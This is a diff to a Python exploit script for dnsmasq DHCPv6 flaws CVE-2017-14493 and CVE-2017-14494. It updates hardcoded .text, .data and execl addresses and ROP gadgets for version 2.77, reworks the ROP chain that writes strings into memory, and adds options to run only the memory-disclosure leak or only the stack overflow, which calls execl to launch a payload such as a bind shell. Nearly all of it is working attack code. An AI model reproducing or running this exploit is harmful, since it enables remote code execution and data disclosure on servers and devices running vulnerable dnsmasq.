@@ -12,35 +12,31 @@ from tm import ThreadManager
 from time import sleep
 from binascii import unhexlify
 from ipaddress import IPv6Address
+from os import stat
 
 tm = ThreadManager(3)
 
 # Architecture i386 segments address
 
-# dnsmasq/2.77 segments address without ASLR
-# 0x0804a310 - 0x08082acc is .text
-# 0x0808b220 - 0x0808c054 is .data
-# 0x0808c060 - 0x0808c374 is .bss
+# dnsmasq/2.77 segments address without PIE
+# 0x08049fa0 - 0x0807e4e2 is .text
+# 0x08097240 - 0x08098072 is .data
 
-# dnsmasq/2.76 segments address without ASLR
+# dnsmasq/2.76 segments address without PIE
 # 0x08049f10 - 0x0807d372 is .text
 # 0x08096240 - 0x08097052 is .data
-# 0x08097060 - 0x080973a8 is .bss
 
-# dnsmasq/2.75 segments address without ASLR
+# dnsmasq/2.75 segments address without PIE
 # 0x08049ee0 - 0x0807b7d2 is .text
 # 0x08093240 - 0x08093f5c is .data
-# 0x08093f60 - 0x08094290 is .bss
 
-# dnsmasq/2.74 segments address without ASLR
+# dnsmasq/2.74 segments address without PIE
 # 0x08049ee0 - 0x0807b7d2 is .text
 # 0x08093240 - 0x08093f5c is .data
-# 0x08093f60 - 0x08094290 is .bss
 
-# dnsmasq/2.73 segments address without ASLR
+# dnsmasq/2.73 segments address without PIE
 # 0x08049f30 - 0x0807bca2 is .text
 # 0x08094240 - 0x08094f5c is .data
-# 0x08094f60 - 0x08095284 is .bss
 
 # NOP
 NOP = {
@@ -59,7 +55,7 @@ CRASH = {
 # JUNK
 JUNK = {
     "i386": {
-        "2.77": 36,
+        "2.77": 24,
         "2.76": 24,
         "2.75": 24,
         "2.74": 24,
@@ -68,10 +64,10 @@ JUNK = {
 }
 
 
-# Segment .text without ASLR
+# Segment .text without PIE
 TEXT = {
     "i386": {
-        "2.77": 0x0804a310,
+        "2.77": 0x08049fa0,
         "2.76": 0x08049f10,
         "2.75": 0x08049ee0,
         "2.74": 0x08049ee0,
@@ -80,10 +76,10 @@ TEXT = {
 }
 
 
-# Segment .data without ASLR
+# Segment .data without PIE
 DATA = {
     "i386": {
-        "2.77": 0x0808b220,
+        "2.77": 0x08097240,
         "2.76": 0x08096240,
         "2.75": 0x08093240,
         "2.74": 0x08093240,
@@ -92,10 +88,10 @@ DATA = {
 }
 
 
-# Execl address without ASLR
+# Execl address without PIE
 EXECL = {
     "i386": {
-        "2.77": 0x08070758,
+        "2.77": 0x0806d0af,
         "2.76": 0x0806c23c,
         "2.75": 0x0806c00e,
         "2.74": 0x0806c00e,
@@ -104,13 +100,12 @@ EXECL = {
 }
 
 
-# ROP gadgets without ASLR
+# ROP gadgets without PIE
 ROP = {
     "i386": {
         "2.77": {
-            "pop eax": 0x08081617,  # pop eax; ret
-            "pop ebx": 0x0804a392,  # pop ebx; pop ebp; ret
-            "mov": 0x080672c3       # mov [eax+0x1],ebx; add cl,cl; ret
+            "pop all": 0x0804a164,  # pop eax ; pop ebx ; pop esi ; ret
+            "mov": 0x0804d793       # mov dword ptr [eax], ebx ; pop ebx ; pop esi ; ret
         },
         "2.76": {
             "pop all": 0x0804a0d4,  # pop eax ; pop ebx ; pop esi ; ret
@@ -134,7 +129,7 @@ ROP = {
     }
 }
 
-N_BYTES = 0xFF00
+LEAK_BYTES = 0xFFBD
 
 Base = Base()
 Base.print_banner()
@@ -142,6 +137,8 @@ Base.print_banner()
 parser = ArgumentParser(description='Exploit for dnsmasq CVE-2017-14493 and CVE-2017-14494')
 
 parser.add_argument('-i', '--interface', help='Set interface name for send packets')
+parser.add_argument('-e', '--exploit', action='store_true', help='Only exploit (CVE-2017-14493)')
+parser.add_argument('-l', '--info_leak', action='store_true', help='Only information leakage (CVE-2017-14494)')
 parser.add_argument('-t', '--target', type=str, help='Set target IPv6 address', required=True)
 parser.add_argument('-p', '--target_port', type=int, help='Set target port, default=547', default=547)
 parser.add_argument('-a', '--architecture', help='Set architecture (i386 or amd64), default=i386', default='i386')
@@ -280,6 +277,15 @@ else:
         exit(1)
 
 
+def calculate_new_address(new_text_address):
+    a = architecture
+    v = dnsmasq_version
+
+    DATA[a][v] = new_text_address + (DATA[a][v] - TEXT[a][v])
+    EXECL[a][v] = new_text_address + (EXECL[a][v] - TEXT[a][v])
+    TEXT[a][v] = new_text_address
+
+
 def get_dhcpv6_server_duid():
     if dhcpv6_server_duid is None:
         print Base.c_info + "Wait for receive DHCPv6 server duid..."
@@ -391,16 +397,8 @@ def add_string_in_data(addr_in_data, string):
             string = string + "\x00" * (8 - (len(string) % 8))
 
     if architecture == "i386":
-        if dnsmasq_version == "2.77":
-            for x in range(0, len(string), 4):
-                rop_chain += Base.pack32(ROP[a][v]["pop eax"])  # pop eax; ret
-                rop_chain += Base.pack32(addr_in_data - 1 + x)  # address in .data - 1
-                rop_chain += Base.pack32(ROP[a][v]["pop ebx"])  # pop ebx; pop ebp; ret
-                rop_chain += string[x:x + 4]                    # 4 byte of string
-                rop_chain += Base.pack32(DATA[architecture][dnsmasq_version] + 28)  # address of .data + 28
-                rop_chain += Base.pack32(ROP[a][v]["mov"])      # mov [eax+0x1],ebx; add cl,cl; ret
 
-        if dnsmasq_version == "2.76":
+        if dnsmasq_version == "2.77" or dnsmasq_version == "2.76":
             for x in range(0, len(string), 4):
                 rop_chain += Base.pack32(ROP[a][v]["pop all"])  # pop eax ; pop ebx ; pop esi ; ret
                 rop_chain += Base.pack32(addr_in_data + x)      # address in .data
@@ -425,17 +423,17 @@ def add_string_in_data(addr_in_data, string):
 
 def inner_pkg(duid):
         return b"".join([
-        Base.pack8(5),            # Type = DHCP6RENEW
-        Base.pack8(0), Base.pack16(1337), # ID
-        gen_option(2, duid),
-        gen_option(1, "", length=(N_BYTES - 8 - 18)) # Client ID
+        Base.pack8(5),                                   # Type = DHCP6RENEW
+        Base.pack8(0), Base.pack16(1337),                # ID
+        gen_option(2, duid),                             # DHCP Server DUID
+        gen_option(1, "", length=(LEAK_BYTES - 8 - 18))  # Client ID
     ])
 
 
 def info_leak():
     # Receive info leak reply
     sock = socket(AF_INET6, SOCK_DGRAM)
-    sock.setsockopt(SOL_SOCKET, SO_RCVBUF, N_BYTES)
+    sock.setsockopt(SOL_SOCKET, SO_RCVBUF, LEAK_BYTES)
     sock.bind(('::', 547))
 
     duid = unhexlify(str(dhcpv6_server_duid).encode("hex"))
@@ -449,7 +447,7 @@ def info_leak():
         ipv6_client_addr,
         '_' * (33 - 17),  # Skip random data.
         # Option 9 - OPTION6_RELAY_MSG
-        gen_option(9, inner_pkg(duid), length=N_BYTES),
+        gen_option(9, inner_pkg(duid), length=LEAK_BYTES),
     ])
 
     eth.src = macsrc
@@ -471,7 +469,8 @@ def info_leak():
         exit(1)
 
     with open('response.bin', 'wb') as response_file:
-        response_file.write(sock.recvfrom(N_BYTES)[0])
+        response_file.write(sock.recvfrom(LEAK_BYTES)[0])
+    print Base.c_success + "Length info leak response: " + str(stat('response.bin').st_size)
     print Base.c_success + "Dump info leak response to file: response.bin"
     sock.close()
 
@@ -492,13 +491,11 @@ def exploit():
         option_79 += Base.pack32(NOP[architecture])  # ESI = 0x90909090
         option_79 += Base.pack32(NOP[architecture])  # EDI = 0x90909090
 
-        if dnsmasq_version == "2.77":
-            option_79 += Base.pack32(NOP[architecture])  # EBP = 0x90909090
-
         option_79 += add_string_in_data(interpreter_addr, interpreter)
         option_79 += add_string_in_data(interpreter_arg_addr, interpreter_arg)
         option_79 += add_string_in_data(payload_addr, payload)
 
+        # option_79 += Base.pack32(CRASH[architecture])                   # crash for debug
         option_79 += Base.pack32(EXECL[architecture][dnsmasq_version])  # address of execl
         option_79 += Base.pack32(interpreter_addr)                      # address of interpreter
         option_79 += Base.pack32(interpreter_addr)                      # address of interpreter
@@ -556,11 +553,15 @@ if __name__ == '__main__':
         print Base.c_info + "Payload bind port: " + bind_port
 
     print Base.c_info + "Payload: " + payload
-    print Base.c_info + "Address segment .text: " + str(TEXT[architecture][dnsmasq_version])
-    print Base.c_info + "Address segment .data: " + str(DATA[architecture][dnsmasq_version])
-    print Base.c_info + "Address execl function: " + str(EXECL[architecture][dnsmasq_version])
 
-    if get_dhcpv6_server_duid():
-        info_leak()
+    # calculate_new_address(0x08049fe0)
+    print Base.c_info + "Address segment .text: " + str(hex(TEXT[architecture][dnsmasq_version]))
+    print Base.c_info + "Address segment .data: " + str(hex(DATA[architecture][dnsmasq_version]))
+    print Base.c_info + "Address execl function: " + str(hex(EXECL[architecture][dnsmasq_version]))
 
-    exploit()
+    if not args.exploit:
+        if get_dhcpv6_server_duid():
+            info_leak()
+
+    if not args.info_leak:
+        exploit()
